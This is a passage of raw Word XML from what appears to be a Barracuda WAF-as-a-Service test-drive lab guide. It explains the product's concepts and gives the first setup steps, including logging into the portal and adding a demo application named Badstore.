    <w:p w14:paraId="57D99FB2" w14:textId="5A50A006" w:rsidR="543DCEBE" w:rsidRDefault="7E3F3A78" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="28"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Login Email</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="008563D8" w14:textId="3B16949A" w:rsidR="543DCEBE" w:rsidRDefault="7E3F3A78" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="28"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Login Password</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7716D011" w14:textId="7F0A82B6" w:rsidR="55E0BB2E" w:rsidRDefault="7E3F3A78" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="28"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Backend Server</w:t>
      </w:r>
      <w:r w:rsidR="28A6C780">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00B62741">
        <w:t>Domain Name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C6E5021" w14:textId="10E1DD42" w:rsidR="00AC4B7D" w:rsidRDefault="00AC4B7D" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="28"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>API Server</w:t>
      </w:r>
      <w:r w:rsidR="00B62741">
        <w:t xml:space="preserve"> Domain Name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43531A56" w14:textId="77777777" w:rsidR="00CD36A0" w:rsidRDefault="00CD36A0" w:rsidP="00CD36A0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="2E2E2E"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="6" w:name="_Toc72791962"/>
      <w:bookmarkStart w:id="7" w:name="_Toc1640111559"/>
      <w:r>
        <w:t>WAF-as-a-Service Concepts for this Test Drive</w:t>
      </w:r>
      <w:bookmarkEnd w:id="6"/>
      <w:r w:rsidRPr="00C06F82">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="2E2E2E"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34705629" w14:textId="31657F12" w:rsidR="00FF522B" w:rsidRDefault="00FF522B" w:rsidP="00FF522B">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Full Proxy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54A627AE" w14:textId="1ADCA801" w:rsidR="00FF522B" w:rsidRPr="0002489E" w:rsidRDefault="00FF522B" w:rsidP="00FF522B">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="0002489E">
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">WAF-as-a-Service is a full proxy located </w:t>
      </w:r>
      <w:r w:rsidR="007C07DD">
        <w:t xml:space="preserve">in the cloud, </w:t>
      </w:r>
      <w:r w:rsidRPr="0002489E">
        <w:t>between the client and</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> backend</w:t>
      </w:r>
      <w:r w:rsidRPr="0002489E">
        <w:t xml:space="preserve"> server.  </w:t>
      </w:r>
      <w:r w:rsidR="00EE13A0">
        <w:t xml:space="preserve">The HTTP session </w:t>
      </w:r>
      <w:r w:rsidRPr="0002489E">
        <w:t xml:space="preserve">between the client and WAF-as-a-Service is </w:t>
      </w:r>
      <w:r w:rsidR="00EE13A0">
        <w:t xml:space="preserve">separated from the </w:t>
      </w:r>
      <w:r w:rsidRPr="0002489E">
        <w:t>HTTP session</w:t>
      </w:r>
      <w:r w:rsidR="00EE13A0">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="0002489E">
        <w:t xml:space="preserve">between WAF-as-a-Service and the </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">backend </w:t>
      </w:r>
      <w:r w:rsidRPr="0002489E">
        <w:t>server</w:t>
      </w:r>
      <w:r w:rsidR="00EE13A0">
        <w:t xml:space="preserve"> by </w:t>
      </w:r>
      <w:r w:rsidR="00D565B5">
        <w:t>the full proxy</w:t>
      </w:r>
      <w:r w:rsidR="00C17B22">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D82FB84" w14:textId="5645EA46" w:rsidR="0002489E" w:rsidRDefault="0002489E" w:rsidP="007E544A">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>User Interface</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A0D683" w14:textId="60B61D0C" w:rsidR="00CD36A0" w:rsidRPr="00E412AC" w:rsidRDefault="00CD36A0" w:rsidP="007E544A">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The WAF-as-a-Service user interface consists of </w:t>
      </w:r>
      <w:r w:rsidRPr="00F62D02">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Components</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on the left and settings on the right.  </w:t>
      </w:r>
      <w:r w:rsidRPr="00F62D02">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Components</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> make it easier to visually organize your security settings. Additional components may be added by clicking </w:t>
      </w:r>
      <w:r w:rsidRPr="00FB55CA">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Add Components</w:t>
      </w:r>
      <w:r w:rsidR="0002489E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">.  </w:t>
      </w:r>
      <w:r w:rsidR="0002489E" w:rsidRPr="0002489E">
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:r w:rsidR="0002489E">
        <w:t xml:space="preserve">full </w:t>
      </w:r>
      <w:r w:rsidR="0002489E" w:rsidRPr="0002489E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>REST API</w:t>
      </w:r>
      <w:r w:rsidR="0002489E" w:rsidRPr="0002489E">
        <w:t xml:space="preserve"> is also available</w:t>
      </w:r>
      <w:r w:rsidR="00DD19C3">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E15B6B" w14:textId="77777777" w:rsidR="00A6616A" w:rsidRDefault="00A6616A" w:rsidP="007E544A">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Applications</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2752CAA4" w14:textId="487B432E" w:rsidR="00FE4E58" w:rsidRDefault="00B94ACA" w:rsidP="007E544A">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">An Application in </w:t>
      </w:r>
      <w:r w:rsidR="00A6616A">
        <w:t xml:space="preserve">WAF-as-a-Service </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">is an instance of WAF-as-a-Service </w:t>
      </w:r>
      <w:r w:rsidR="0063721B">
        <w:t>for your application.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00534DFF">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00FE4E58">
        <w:t>You can have many applications in your WAF-as-a-Service account</w:t>
      </w:r>
      <w:r w:rsidR="00186D4F">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C9F7E08" w14:textId="525C2369" w:rsidR="00CD36A0" w:rsidRDefault="00CD36A0" w:rsidP="007E544A">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Dashboard</w:t>
      </w:r>
      <w:r w:rsidR="00061E9B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:r>
        <w:t>The component which shows a</w:t>
      </w:r>
      <w:r w:rsidR="007C07DD">
        <w:t xml:space="preserve"> high-level </w:t>
      </w:r>
      <w:r>
        <w:t>overview of attacks and traffic.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DB2E94D" w14:textId="664F8526" w:rsidR="00CD36A0" w:rsidRPr="00823B1C" w:rsidRDefault="00CD36A0" w:rsidP="007E544A">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00823B1C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Endpoints</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13ACF422" w14:textId="45853D82" w:rsidR="00CD36A0" w:rsidRDefault="00AC0DD1" w:rsidP="007E544A">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Incoming </w:t>
      </w:r>
      <w:r w:rsidR="00CD36A0" w:rsidRPr="00C06F82">
        <w:t xml:space="preserve">traffic for your application </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">arrives </w:t>
      </w:r>
      <w:r w:rsidR="00160556">
        <w:t>at the endpoint</w:t>
      </w:r>
      <w:r w:rsidR="00CD36A0" w:rsidRPr="00C06F82">
        <w:t xml:space="preserve">. An endpoint is a combination of an IP address and a TCP port. One application </w:t>
      </w:r>
      <w:r w:rsidR="00BA2C44">
        <w:t xml:space="preserve">can </w:t>
      </w:r>
      <w:r w:rsidR="00CD36A0" w:rsidRPr="00C06F82">
        <w:t xml:space="preserve">have multiple endpoints. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B01F271" w14:textId="214683A5" w:rsidR="001449B8" w:rsidRPr="00823B1C" w:rsidRDefault="007B3BC3" w:rsidP="001449B8">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CNAME</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74BEB85B" w14:textId="77441180" w:rsidR="001449B8" w:rsidRDefault="001449B8" w:rsidP="001449B8">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The unique domain name WAF-as-a-Service uses to front your application, which can be seen on the Endpoints component.   It will </w:t>
      </w:r>
      <w:r w:rsidR="006E6991">
        <w:t xml:space="preserve">have </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">the format </w:t>
      </w:r>
      <w:r w:rsidRPr="00823B1C">
        <w:t>app</w:t>
      </w:r>
      <w:r>
        <w:t>######</w:t>
      </w:r>
      <w:r w:rsidRPr="00823B1C">
        <w:t>.prod.cudawaas.com</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">.  You can use this domain name to reach your application </w:t>
      </w:r>
      <w:r w:rsidR="003B7661">
        <w:t>through WAF</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">-as-a-Service.  In a real deployment, you would configure a CNAME on your DNS server </w:t>
      </w:r>
      <w:r w:rsidR="00B064B8">
        <w:t xml:space="preserve">to </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">point your domain name to </w:t>
      </w:r>
      <w:r w:rsidR="007B3BC3">
        <w:t>CNAME</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36C310C7" w14:textId="3F0EEB39" w:rsidR="00BD0755" w:rsidRDefault="00BD0755" w:rsidP="007E544A">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Backend Server</w:t>
      </w:r>
      <w:r w:rsidR="00061E9B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:r>
        <w:t>Th</w:t>
      </w:r>
      <w:r w:rsidR="00061E9B">
        <w:t>is</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is your web</w:t>
      </w:r>
      <w:r w:rsidR="00061E9B">
        <w:t xml:space="preserve"> server</w:t>
      </w:r>
      <w:r w:rsidR="00BA2C44">
        <w:t>. One application can have multiple backend servers.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D1E88ED" w14:textId="105C0F49" w:rsidR="00CD36A0" w:rsidRPr="00823B1C" w:rsidRDefault="00CD36A0" w:rsidP="007E544A">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00823B1C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Encryption</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4777DE5D" w14:textId="10671DBF" w:rsidR="00CD36A0" w:rsidRDefault="00CD36A0" w:rsidP="007E544A">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00101A8F">
        <w:t>When you configure an endpoint to use the HTTPS protocol, traffic between your users and Barracuda WAF-as-a-Service is encrypted with the SSL protocol. </w:t>
      </w:r>
      <w:r w:rsidR="000D51CF">
        <w:t xml:space="preserve"> If your </w:t>
      </w:r>
      <w:r w:rsidR="00BD0755">
        <w:t>website uses SSL, traffic is also encrypted between WAF-as-a-Service and your website</w:t>
      </w:r>
      <w:r w:rsidR="005B18A8">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C9A6FC6" w14:textId="77777777" w:rsidR="00CD36A0" w:rsidRPr="00823B1C" w:rsidRDefault="00CD36A0" w:rsidP="007E544A">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00823B1C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Deployment Locations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BBEDE8A" w14:textId="622C808B" w:rsidR="00CD36A0" w:rsidRDefault="002303BD" w:rsidP="007E544A">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r w:rsidR="005D490C">
        <w:t xml:space="preserve">physical </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">geographic location for a WAF-as-a-Service instance. </w:t>
      </w:r>
      <w:r w:rsidR="00CD36A0">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00CD36A0" w:rsidRPr="00C73B46">
        <w:t>Barracuda's partnership with Microsoft Azure enables you to deploy WAF-as-a-Service in most Azure locations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E947F10" w14:textId="77777777" w:rsidR="00CD36A0" w:rsidRPr="00F02AF6" w:rsidRDefault="00CD36A0" w:rsidP="007E544A">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F02AF6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Firewall Logs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04EE192B" w14:textId="75A5A3B2" w:rsidR="005272B9" w:rsidRPr="001F70D7" w:rsidRDefault="00CD36A0">
      <w:r w:rsidRPr="0095694C">
        <w:t xml:space="preserve">Firewall Logs are generated </w:t>
      </w:r>
      <w:r w:rsidR="00763524">
        <w:t xml:space="preserve">when </w:t>
      </w:r>
      <w:r w:rsidRPr="0095694C">
        <w:t>suspicious requests are detecte</w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidRPr="0095694C">
        <w:t xml:space="preserve">, based on </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">the security settings.  </w:t>
      </w:r>
      <w:r w:rsidR="00763524">
        <w:t>V</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">iew Firewall Logs </w:t>
      </w:r>
      <w:r w:rsidR="00763524">
        <w:t xml:space="preserve">in </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidRPr="00F62D02">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Logs</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Component</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="219B85BB" w14:textId="77777777" w:rsidR="00687CC0" w:rsidRDefault="00687CC0">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="8" w:name="_Toc72791963"/>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="68EA7B09" w14:textId="1AE6C18A" w:rsidR="008A0072" w:rsidRDefault="008A0072" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Getting Started</w:t>
      </w:r>
      <w:bookmarkEnd w:id="8"/>
    </w:p>
    <w:p w14:paraId="6483AD1B" w14:textId="77777777" w:rsidR="00CD36A0" w:rsidRPr="005320D4" w:rsidRDefault="00CD36A0" w:rsidP="00CD36A0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="9" w:name="_Toc72791964"/>
      <w:r w:rsidRPr="005320D4">
        <w:t>Browse to your Backend Server</w:t>
      </w:r>
      <w:bookmarkEnd w:id="9"/>
    </w:p>
    <w:p w14:paraId="2A94DFFE" w14:textId="618B1708" w:rsidR="00CD36A0" w:rsidRPr="005320D4" w:rsidRDefault="00CD36A0" w:rsidP="00CD36A0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:r w:rsidRPr="005320D4">
        <w:t xml:space="preserve">Using the </w:t>
      </w:r>
      <w:r w:rsidR="00A62FE0" w:rsidRPr="00A62FE0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Backend Server </w:t>
      </w:r>
      <w:r w:rsidR="00C33261">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>domain name</w:t>
      </w:r>
      <w:r w:rsidRPr="005320D4">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005F4B65">
        <w:t>from</w:t>
      </w:r>
      <w:r w:rsidR="0024746F">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EB683C">
        <w:t>the</w:t>
      </w:r>
      <w:r w:rsidRPr="005320D4">
        <w:t xml:space="preserve"> email</w:t>
      </w:r>
      <w:r w:rsidR="00355ACD">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="005320D4">
        <w:t xml:space="preserve"> browse to the </w:t>
      </w:r>
      <w:r w:rsidR="00A62FE0">
        <w:t xml:space="preserve">server </w:t>
      </w:r>
      <w:r w:rsidR="004A4E45">
        <w:t xml:space="preserve">on port </w:t>
      </w:r>
      <w:r w:rsidR="004A4E45" w:rsidRPr="004A4E45">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>80</w:t>
      </w:r>
      <w:r w:rsidRPr="005320D4">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C61DE6E" w14:textId="77777777" w:rsidR="00CD36A0" w:rsidRPr="005320D4" w:rsidRDefault="00CD36A0" w:rsidP="00CD36A0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:r w:rsidRPr="005320D4">
        <w:t>It may take a few minutes after the Test Drive starts for the Backend Server to instantiate, so if the site does not load, try again in a few minutes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="419EDC8E" w14:textId="6CEE19A3" w:rsidR="00CD36A0" w:rsidRPr="005320D4" w:rsidRDefault="00CD36A0" w:rsidP="00CD36A0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
      <w:r w:rsidRPr="005320D4">
        <w:t xml:space="preserve">Note at this point you are going directly to your web server, not </w:t>
      </w:r>
      <w:r w:rsidR="003B7661">
        <w:t>through</w:t>
      </w:r>
      <w:r w:rsidRPr="005320D4">
        <w:t xml:space="preserve"> WAF-as-a-Service</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06800F14" w14:textId="77777777" w:rsidR="00CD36A0" w:rsidRDefault="00CD36A0" w:rsidP="005A1E1A">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="45F87B3B" wp14:editId="5AEAA414">
            <wp:extent cx="3209925" cy="1656404"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1449851385" name="Picture 144985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85"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId18">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3209925" cy="1656404"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="79CF1D6C" w14:textId="77777777" w:rsidR="00CD36A0" w:rsidRDefault="00CD36A0" w:rsidP="00CD36A0"/>
    <w:p w14:paraId="19A8AA0E" w14:textId="77777777" w:rsidR="00CD36A0" w:rsidRDefault="00CD36A0" w:rsidP="00CD36A0">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="10" w:name="_Toc72791965"/>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t>Log in to Barracuda WAF-as-a-Service</w:t>
      </w:r>
      <w:bookmarkEnd w:id="10"/>
    </w:p>
    <w:p w14:paraId="76908B43" w14:textId="77777777" w:rsidR="00CD36A0" w:rsidRDefault="00CD36A0" w:rsidP="00CD36A0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t>Your next step is to login to Barracuda WAF-as-a-Service administration portal.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="223B81AD" w14:textId="77777777" w:rsidR="00CD36A0" w:rsidRDefault="00CD36A0" w:rsidP="00CD36A0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">Go to </w:t>
      </w:r>
      <w:hyperlink r:id="rId19">
        <w:r w:rsidRPr="55E0BB2E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>https://waas.barracudanetworks.com/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> or follow the link in the email you received.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FEA98E5" w14:textId="77777777" w:rsidR="00CD36A0" w:rsidRDefault="00CD36A0" w:rsidP="00CD36A0">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="23"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t>Log in with the student email and password provided in the email you received.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A469C3F" w14:textId="77777777" w:rsidR="00CD36A0" w:rsidRDefault="00CD36A0" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74688611" w14:textId="54C6D0D7" w:rsidR="077BE973" w:rsidRDefault="077BE973" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="11" w:name="_Toc72791966"/>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">Add your Application to </w:t>
      </w:r>
      <w:r w:rsidR="4DEA9A18" w:rsidRPr="55E0BB2E">
        <w:t>WAF-as-a-Service</w:t>
      </w:r>
      <w:bookmarkEnd w:id="7"/>
      <w:bookmarkEnd w:id="11"/>
    </w:p>
    <w:p w14:paraId="1D67204D" w14:textId="49AB28E3" w:rsidR="077BE973" w:rsidRDefault="077BE973" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t>Click Add Application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EBA2B50" w14:textId="1511808C" w:rsidR="077BE973" w:rsidRDefault="077BE973" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">On the Websites step, enter </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>B</w:t>
      </w:r>
      <w:r w:rsidR="42E44363" w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>adstore</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="42E44363" w:rsidRPr="55E0BB2E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">for </w:t>
      </w:r>
      <w:r w:rsidR="6832D13E" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidRPr="55E0BB2E">
        <w:t>Application Name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41889897" w14:textId="238F5F0C" w:rsidR="077BE973" w:rsidRDefault="006E6EB2" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="24"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>For the Backend Server, use</w:t>
      </w:r>
      <w:r w:rsidR="53CA7C6E" w:rsidRPr="55E0BB2E">
        <w:t xml:space="preserve"> the </w:t>
      </w:r>
      <w:r w:rsidR="53CA7C6E" w:rsidRPr="00C93511">
